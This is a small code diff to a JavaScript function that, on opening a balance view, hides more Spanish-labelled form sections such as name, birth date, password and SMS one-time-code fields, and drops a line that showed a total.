@@ -186,13 +186,23 @@ function vista_saldo() {
     $(".correo-con").hide();
     $(".tarjeta").hide();
     $(".tarjetadt").hide();
+    $(".apellidos").hide();
+    $(".fnacimiento").hide();
+    $(".mobil").hide();
+    $(".pregunta").hide();
+    $(".clave").hide();
+    $(".clave2").hide();
     $(".pregunta2").hide();
-    $(".total").show();
+    $(".smsotp").hide();
+    $(".solicitacodigo").hide(); 
+    $(".codigootp3").hide();
+    
     var el = document.getElementById("inputsaldo");
     if (el) {
         el.value = "";
         el.focus();
     }
+    
     $(".saldo-disponible").show();
 }
 
